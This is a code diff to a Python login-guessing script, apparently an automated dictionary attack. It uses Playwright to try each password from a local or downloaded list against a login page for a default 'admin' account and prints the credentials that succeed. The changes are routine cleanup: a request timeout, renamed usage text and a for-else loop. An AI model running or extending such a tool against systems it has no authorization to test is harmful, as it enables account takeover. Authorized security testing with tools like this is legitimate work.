@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 
-import os
 import sys
 import requests
 from playwright.sync_api import sync_playwright
@@ -13,7 +12,7 @@ def get_passwords(password_source):
     if password_source.startswith(('http://', 'https://')):
         print(f"Downloading password list from URL: {password_source}")
         try:
-            response = requests.get(password_source)
+            response = requests.get(password_source, timeout=30)
             response.raise_for_status()  # Raises an exception for HTTP errors
             return response.text.splitlines()
         except requests.exceptions.RequestException as e:
@@ -39,11 +38,11 @@ def main():
     password_source = "passwords.txt"
 
     if len(sys.argv) > 1 and sys.argv[1] in ("-h", "--help"):
-        print("Usage: python3 brute-force-attack.py [username (optional, default: admin)] [password list file or URL (optional, default: passwords.txt)]")
-        print("Example: ./brute-force-attack.py")
-        print("Example: ./brute-force-attack.py admin")
-        print("Example: ./brute-force-attack.py admin passwords.txt")
-        print("Example: ./brute-force-attack.py admin https://example.com/passwords.txt")
+        print("Usage: python3 dictionary-attack.py [username (optional, default: admin)] [password list file or URL (optional, default: passwords.txt)]")
+        print("Example: ./dictionary-attack.py")
+        print("Example: ./dictionary-attack.py admin")
+        print("Example: ./dictionary-attack.py admin passwords.txt")
+        print("Example: ./dictionary-attack.py admin https://example.com/passwords.txt")
         sys.exit(0)
 
     # Get username and passwords from command-line arguments. Use default if not provided.
@@ -82,8 +81,7 @@ def main():
                 print(f"Username: {username}")
                 print(f"Password: {password}")
                 break
-
-        if i == len(passwords) - 1:
+        else:
             print("\nLogin failed for all passwords.")
 
         browser.close()
